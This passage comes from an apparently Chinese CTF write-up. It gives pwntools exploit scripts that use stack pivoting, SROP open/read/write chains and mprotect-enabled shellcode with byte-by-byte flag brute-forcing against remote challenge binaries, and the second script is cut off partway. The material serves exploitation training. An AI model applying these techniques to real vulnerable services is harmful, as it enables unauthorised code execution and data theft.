    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>首先让bss段读入ROP链，然后栈迁移执行ROP链，ROP链中使用SROP ORW一把嗦</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&#34;47.108.206.43&#34;</span><span class="p">,</span><span class="mi">26637</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#p=process(&#39;./chall&#39;)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">rn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>  <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">dbg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="o">=</span><span class="kc">None</span>  <span class="p">:</span> <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xff</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">pr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mydbg</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">	<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">bss</span><span class="o">=</span><span class="mh">0x0404060</span>
</span></span><span class="line"><span class="cl"><span class="n">leave_ret</span><span class="o">=</span><span class="mh">0x000000000040136c</span>
</span></span><span class="line"><span class="cl"><span class="n">mov_rax_15_ret</span><span class="o">=</span><span class="mh">0x401193</span> 
</span></span><span class="line"><span class="cl"><span class="n">syscall_ret</span><span class="o">=</span><span class="mh">0x000000000040118a</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span><span class="p">(</span><span class="s2">&#34;easyhack</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sigframe</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">sigframe</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_open</span>
</span></span><span class="line"><span class="cl"><span class="n">sigframe</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">bss</span><span class="o">+</span><span class="mh">0x400</span>
</span></span><span class="line"><span class="cl"><span class="n">sigframe</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">sigframe</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">sigframe</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">bss</span><span class="o">+</span><span class="mh">0xf8</span><span class="o">+</span><span class="mh">0x10</span>
</span></span><span class="line"><span class="cl"><span class="n">sigframe</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall_ret</span>
</span></span><span class="line"><span class="cl"><span class="n">sigframe1</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">sigframe1</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_read</span>
</span></span><span class="line"><span class="cl"><span class="n">sigframe1</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="n">sigframe1</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="n">bss</span><span class="o">+</span><span class="mh">0x420</span>
</span></span><span class="line"><span class="cl"><span class="n">sigframe1</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x50</span>
</span></span><span class="line"><span class="cl"><span class="n">sigframe1</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">bss</span><span class="o">+</span><span class="mh">0xf8</span><span class="o">+</span><span class="mh">0x10</span><span class="o">+</span><span class="mh">0xf8</span><span class="o">+</span><span class="mh">0x10</span><span class="o">+</span><span class="mh">0x8</span>
</span></span><span class="line"><span class="cl"><span class="n">sigframe1</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall_ret</span>
</span></span><span class="line"><span class="cl"><span class="n">sigframe2</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">sigframe2</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_write</span>
</span></span><span class="line"><span class="cl"><span class="n">sigframe2</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="n">sigframe2</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="n">bss</span><span class="o">+</span><span class="mh">0x420</span>
</span></span><span class="line"><span class="cl"><span class="n">sigframe2</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x50</span>
</span></span><span class="line"><span class="cl"><span class="n">sigframe2</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">bss</span><span class="o">+</span><span class="mh">0xf8</span><span class="o">+</span><span class="mh">0x10</span><span class="o">+</span><span class="mh">0xf8</span><span class="o">+</span><span class="mh">0x10</span>
</span></span><span class="line"><span class="cl"><span class="n">sigframe2</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall_ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#F8</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">mov_rax_15_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span><span class="o">+</span><span class="nb">bytes</span><span class="p">(</span><span class="n">sigframe</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">mov_rax_15_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span><span class="o">+</span><span class="nb">bytes</span><span class="p">(</span><span class="n">sigframe1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">mov_rax_15_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span><span class="o">+</span><span class="nb">bytes</span><span class="p">(</span><span class="n">sigframe2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x400</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s2">&#34;flag</span><span class="se">\x00\x00\x00\x00</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Do u know what is SUID?&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#mydbg()</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x2a</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 class="heading-element" id="seccomp"><span>Seccomp</span>
  <a href="#seccomp" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>跟上题大概逻辑一样，开的沙箱不一样，禁用了write，运行mprotect，那么利用srop 使用mprotect开辟rwx段，然后写shellcode， open 打开flag ，read 读入flag ，然后 逐个字节爆破flag。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span><span class="lnt">93
</span><span class="lnt">94
</span><span class="lnt">95
</span><span class="lnt">96
</span><span class="lnt">97
</span><span class="lnt">98
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">rn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>  <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">dbg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="o">=</span><span class="kc">None</span>  <span class="p">:</span> <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xff</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">pr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mydbg</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">	<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">pause</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">bss</span><span class="o">=</span><span class="mh">0x0404060</span>
</span></span><span class="line"><span class="cl"><span class="n">leave_ret</span><span class="o">=</span><span class="mh">0x000000000040136c</span>
</span></span><span class="line"><span class="cl"><span class="n">mov_rax_15_ret</span><span class="o">=</span><span class="mh">0x401193</span> 
</span></span><span class="line"><span class="cl"><span class="n">syscall_ret</span><span class="o">=</span><span class="mh">0x000000000040118a</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">pwn</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="n">char</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;easyhack</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">sigframe</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">	<span class="n">sigframe</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_mprotect</span>
</span></span><span class="line"><span class="cl">	<span class="n">sigframe</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="mh">0x404000</span>
</span></span><span class="line"><span class="cl">	<span class="n">sigframe</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mh">0x500</span>
</span></span><span class="line"><span class="cl">	<span class="n">sigframe</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">7</span>
</span></span><span class="line"><span class="cl">	<span class="n">sigframe</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">bss</span><span class="o">+</span><span class="mh">0xf8</span><span class="o">+</span><span class="mh">0x10</span>
</span></span><span class="line"><span class="cl">	<span class="n">sigframe</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall_ret</span>
</span></span><span class="line"><span class="cl">	<span class="n">shellcode</span><span class="o">=</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">shellcode</span><span class="o">+=</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="n">bss</span><span class="o">+</span><span class="mh">0x500</span><span class="p">,</span><span class="mh">0x50</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">shellcode</span><span class="o">+=</span> <span class="sa">F</span><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">		cmp byte ptr[rsi+</span><span class="si">{</span><span class="n">pos</span><span class="si">}</span><span class="s1">], </span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">		jz loop
</span></span></span><span class="line"><span class="cl"><span class="s1">		ret
</span></span></span><span class="line"><span class="cl"><span class="s1">		loop:
</span></span></span><span class="line"><span class="cl"><span class="s1">		jmp loop
</span></span></span><span class="line"><span class="cl"><span class="s1">	&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">	<span class="c1">#F8</span>
</span></span><span class="line"><span class="cl">	<span class="n">payload</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">mov_rax_15_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span><span class="o">+</span><span class="nb">bytes</span><span class="p">(</span><span class="n">sigframe</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="o">+</span><span class="mh">0xf8</span><span class="o">+</span><span class="mh">0x10</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span><span class="o">+</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">sl</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Do u know what is SUID?&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="c1">#mydbg()</span>
